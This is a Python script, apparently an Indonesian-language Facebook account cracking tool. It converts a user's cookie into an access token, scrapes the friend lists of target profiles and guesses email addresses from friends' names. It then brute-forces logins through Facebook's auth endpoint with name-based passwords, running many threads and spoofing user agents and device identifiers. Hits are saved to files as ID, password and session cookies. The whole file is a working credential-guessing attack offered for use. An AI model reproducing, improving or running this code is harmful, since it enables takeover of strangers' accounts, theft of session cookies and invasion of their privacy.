# ---- import module.
import requests
import json
import os
import sys
import datetime
import time
import uuid
import re
import random
from concurrent.futures import ThreadPoolExecutor as tred
from random import choice as rc, randint as rr
ses = requests.Session()
# ---- import rich.
from rich import print as prints
# ---- append dll.
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
method=[]
pwnya=[]
double=[]
rr = random.randint
rc = random.choice
# ---- warna.
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
# ---- tanggal bulan tahun.
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# ---- clear.
def clear():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass
# ---- logo.
def banner():
    print(f"""
  
             {H} ________  ___  _______ __
             / ___/ _ \/ _ |/ ___/ //_/
            / /__/ , _/ __ / /__/ ,<   
            \___/_/|_/_/ |_\___/_/|_|  
                {P}Coded by: fauzanIDN
      ---------------------------------------
            """
        )
# ---- login cookies.
def login():
    banner()
    print(f"\n{P}  [{O}+{P}] masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
    print(f"  [{O}+{P}] notice: jika tetap invalid,gunakan akun tumbal dengan id 10008 kebawah.")
    print(f"  [{O}+{P}] notice: gunakan mode dekstop pada browser saat pengambilan cookies.")
    cok = input(f'  [{O}+{P}] cookies : {H}')
    open('.cok.txt', 'a').write(cok)
    try:
        ses.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
        response = ses.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/rendragunabinawan/', cookies={'cookie':cok})
        if '"access_token":' in str(response.headers):
            token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
            open('.token.txt', 'a').write(token)
            exit(f"{P}  [{O}+{P}] token : {H}{token}{P} \n  [{O}+{P}] cookies aktif,jalankan ulang perintah nya dengan ketik python run.py");time.sleep(3)
        else:
            exit(f'{P}  [{O}+{P}] cookie kamu invalid silahkan menggunakan tumbal/cookies lain.')
    except Exception as e:exit(e)
# ----> menu script.
def menu():
    clear()
    banner()
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except (IOError, KeyError, FileNotFoundError):
        print(f'\n{P}  [{O}+{P}] Cookies kamu invalid.{P}')
        time.sleep(2)
        os.system('clear')
        login()
        return

    try:
        ses = requests.Session()
        info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies={'cookies': cok}).json()
        nama = info_datafb["name"]
        uidfb = info_datafb["id"]
    except requests.exceptions.ConnectionError:
        exit(f"\n{P}  [{O}+{P}] Tidak ada koneksi{P}")
    except KeyError:
        try:
            os.remove(".cok.txt")
            os.remove(".token.txt")
        except:
            pass
        print(f"\n{P}  [{O}+{P}] Akun terkena checkpoint...{P}")
        time.sleep(2)
        os.system('clear')
        login()
        return

    print(f"{P}  [{O}+{P}] Halo {H}{nama}{P}, selamat datang di tools DFI Brute Facebook{P}")
    print(f"\n{P}  [{O}+{P}] Pastikan ID target publik/tidak private.{P}")

    try:
        total = int(input(f"{P}  [{O}+{P}] Masukan jumlah target: {H}"))
    except ValueError:
        total = 1

    for mnh in range(total):
        id_target = input(f'{P}  [{O}+{P}] Input ID ke {mnh + 1}: {H}')
        uid.append(id_target)

    for user_id in uid:
        try:
            req = ses.get(f'https://graph.facebook.com/{user_id}?fields=friends.fields(id,name)&access_token={token}', cookies={'cookies': cok}).json()
            for friend in req.get('friends', {}).get('data', []):
                try:
                    full_name = friend["name"]
                    name_parts = full_name.split(' ')
                    first_name = name_parts[0].lower()
                    last_name = name_parts[1].lower() if len(name_parts) > 1 else ""
                    combinations = [
                        f"{first_name}{last_name}"
                    ]
                    domain = rc(["@gmail.com"])
                    email_variasi = rc(combinations)
                    email = f"{email_variasi}{domain}|{full_name}"
                    if email not in id:
                        id.append(email)
                except Exception:
                    pass
                sys.stdout.write(f"\r  [{O}+{P}] Mengumpulkan ID, sukses mengumpulkan {H}{len(id)}{P} ID...{P}")
                sys.stdout.flush()
        except KeyError:
            pass
        except requests.exceptions.ConnectionError:
            exit(f'  [{O}+{P}] Koneksi buruk, silahkan refresh jaringan Anda. ')

    try:
        setting()
    except requests.exceptions.ConnectionError:
        exit(f'  [{O}+{P}] Koneksi buruk, silahkan refresh jaringan Anda. ')

def setting():
    print(f"{P}Setting function placeholder{P}")
def setting():
    print("")
    print(f"\n{P}  [{O}+{P}] 1. urutan new ke old. \n  [{O}+{P}] 2. urutan random. {P}")
    urutan_setting = input(f'\n  [{O}+{P}] pilih 1/2 : ')
    
    if urutan_setting in ['1', '01']:
        muda = []
        for new in sorted(id):
            muda.append(new)
        bcm = len(muda)
        bcmi = (bcm - 1)
        for xmud in range(bcm):
            uid2.append(muda[bcmi])
            bcmi -= 1
    elif urutan_setting in ['2', '02']:
        for acak in id:
            xx = random.randint(0, len(uid2))
            uid2.insert(xx, acak)
    else:
        print(f"  [{O}+{P}] Input hanya dengan angka, jangan kosong.")
        exit()
    Passww()
# ---- set password manual.
def Passww():
    print(f"""
  [{O}+{P}] {P} Hasil Live akan tersimpan di : {H}DFILIVE/{okc}{P}
  [{O}+{P}] {P} Hasil Check akan tersimpan di : {K}DFICHEK/{cpc}{P}
  [{O}+{P}] {P} Mainkan mode pesawat 5 detik jika tidak ada hasil.
""")

    def generate_passwords(depan, belakang):
        pasw = []
        pasw.append(depan + '123')
        pasw.append(depan + '1234')
        pasw.append(depan + '12345')
        pasw.append(depan + '12345')
        pasw.append(depan + '123456')
        pasw.append(depan + '1234567')
        pasw.append(depan + '12345678')
        pasw.append(depan + '123456789')
        pasw.append(depan + '12')
        pasw.append(depan + '11')
        pasw.append(depan + '13')
        pasw.append(depan + '14')
        pasw.append(depan + '15')
        pasw.append(depan + '16')
        pasw.append(depan + '17')
        pasw.append(depan + '18')
        pasw.append(depan + '19')
        pasw.append(depan + '20')
        pasw.append(depan + '21')
        pasw.append(depan + '22')
        pasw.append(depan + '23')
        pasw.append(depan + '24')
        pasw.append(depan + '25')
        pasw.append(depan + '26')
        pasw.append(depan + '27')
        pasw.append(depan + '28')
        pasw.append(depan + '29')
        return pasw

    with tred(max_workers=50) as MethodeCrack:
        for user in uid2:
            uid, nama = user.split('|')[0], user.split('|')[1].lower()
            depan = nama.split(" ")[0]
            
            # Menangani kasus jika tidak ada nama belakang
            try:
                belakang = nama.split(" ")[1]
            except IndexError:
                belakang = depan

            # Memeriksa panjang nama
            pasw = []
            if len(nama) < 6:
                if len(depan) >= 3:
                    pasw.extend(generate_passwords(depan, belakang))
            else:
                if len(depan) >= 3:
                    pasw.extend(generate_passwords(depan, belakang))
                else:
                    pasw.append(nama)
            
            MethodeCrack.submit(API, uid, pasw)

    print("\r")
    print(f"{P}  [{O}+{P}] Sukses crack {H}{len(uid2)}{P} id, dengan jumlah hasil Live: {H}{ok} {P}Check: {K}{cp}{P}")
# ---- menu useragent.
def aguss():
    rr = random.randint
    rc = random.choice
    fbcr = str(
        random.choice([
            'TELKOMSEL', 'AXIS', 'Indosat', 'XL', '3SinyalKuatHemat',
            'Tsel-PakaiMasker', 'XL Axiata'
        ]))
    androversi = random.choice(["15_4", "14_3", "13_5", "14_5", "13_4"])
    build = ['MRA58K', 'UCC50Z', 'QKQ1.200127.002']
    andro = ['k', 'a', 'b', 'x', 'y', 'z', 'd', 'l']
    browser = ['HeyTapBrowser', 'MZBrowser']
    asep1 = random.choice(["Y6MLQN", "8G7LN3", "2783VM", "X35XFL", "W5T30Y"])
    asep4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {androversi} like Mac OS X) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    asep5 = f"Mozilla/5.0 (Linux; Android {androversi} SM-N960N Build/QP1A.190711.020; wv) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/4.0 Chrome/{rr(10,99)}.0.{rr(1000,9999)}.{rr(73,150)} Whale/1.0.0.0 Crosswalk/25.80.14.20 Mobile Safari/537.36 NAVER(inapp; search; 598; 10.28.2)"
    asep10 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; itel A663L Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36"
    asep6 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/455.0.0.44.88;]"
    asep7 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; V1818CA Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 VivoBrowser/18.6.0.0"
    asep8 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; zh-tw; PCLM50 AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 HeyTapBrowser/40.8.27.1"
    asep9 = f"Mozilla/5.0 (Linux; AndroId {str(rr(2,13))}; zh-CN; M2104K10AC Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} UCBrowser/16.3.8.1289 Mobile Safari/537.36"
    v1 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro Build/{str(rc(build))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(73,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]"
    v2 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Mobile Safari/537.36"
    v3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN; MZ-meizu 17 Pro Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} MZBrowser/8.{str(rr(1,20))}.1 Mobile Safari/537.36"
    v4 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; {str(rc(andro))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(59,169))}.0.0.0 Mobile Safari/537.36"
    hir = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN MZ-MEIZU 18 Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(100,150))} {str(rc(browser))}/9.{str(rr(1,20))}.1 Mobile safari/537.36"
    ua_rmx = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; RMX{str(rr(1599,3999))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(89,120))}.0.{str(rr(3999,4999))}.{str(rr(55,129))} Mobile Safari/537.36"
    ua_oppo = f"Mozilla/5.0 (Linux; Android {str(rr(4,13))}; CPH{str(rr(1999,4999))} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(59,159))}.0.{str(rr(2999,4999))}.{str(rr(55,159))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]"
    ya = random.choice([hir, asep4,asep5, asep10, asep6, asep7, asep8, asep9, v1, v2, v3, v4,ua_rmx,ua_oppo])
    return ya
# ---- login.
loop, ok, cp = 0, 0, 0
double = []

def generate_random_number(length):
    return ''.join([str(random.randint(0, 9)) for _ in range(length)])

def API(uid, pasw):
    global loop, ok, cp

    print(f"\r  {P}[INFO] Progress: {loop}/{len(uid2)} OK: {ok} CP: {cp}", end="")
    ses = requests.Session()

    for pw in pasw:
        try:
            ua = aguss()
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': uid,
                'password': pw,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'sim_serials': f"['{generate_random_number(20)}']",
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': f"['{generate_random_number(11)}@gmail.com']",
                'openid_tokens': f"['{uuid.uuid4()}']",
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
            }

            headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Priority': 'u=3, i',
                'X-Fb-Sim-Hni': generate_random_number(5),
                'X-Fb-Net-Hni': generate_random_number(5),
                'X-Fb-Connection-Quality': 'GOOD',
                'Zero-Rated': '0',
                'User-Agent': ua,
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'X-Fb-Connection-Type': 'unknown',
                'X-Fb-Device-Group': str(random.randint(4000, 8000)),
                'X-Tigon-Is-Retry': 'False',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Request-Analytics-Tags': 'unknown',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'Content-Length': str(len(str(data)))
            }

            curl = 'https://b-graph.facebook.com/auth/login'
            q = ses.post(curl, data=data, headers=headers).json()

            if "session_key" in q:
                ok += 1
                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                idf = re.findall('c_user=(.*);xs', coki)[0] if 'c_user' in coki else uid
                if idf in double:
                    break
                double.append(idf)
                print(f"\r  [OK] {H}{idf}|{pw}|{coki}\n{ua}")
                open('/sdcard/DFILIVE/'+okc,'a').write(f"{idf}|{pw}\n")
                break

            elif "User must verify their account" in q.get("error", {}).get("message", ""):
                cp += 1
                idf = q['error']['error_data']['uid'] if 'uid' in q['error']['error_data'] else uid
                if idf in double:
                    break
                double.append(idf)
                print(f"\r  [CP] {K}{idf}|{pw}")
                open('/sdcard/DFICHEK/'+cpc,'a').write(f"{idf}|{pw}\n")
                break

        except requests.exceptions.ConnectionError:
            time.sleep(15)

    loop += 1

def file():
    clear();banner()
    file = input(f"\n{P}  [{O}+{P}] masukan nama folder/file : ")
    try:
        uid = open(file,"r").read().splitlines()
        for data in uid:
            try:user,nama = data.split('|')
            except:continue
            sys.stdout.write(f"\r  [{O}+{P}] sedang mengumpulkanle id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
            sys.stdout.flush()
            id.append(data)
    except FileNotFoundError:exit(f"  [{O}+{P}] file tidak ada")
    setting()
    
if __name__=='__main__':
    try:os.mkdir('DFILIVE')
    except:pass
    try:os.mkdir('DFICHEK')
    except:pass
    menu()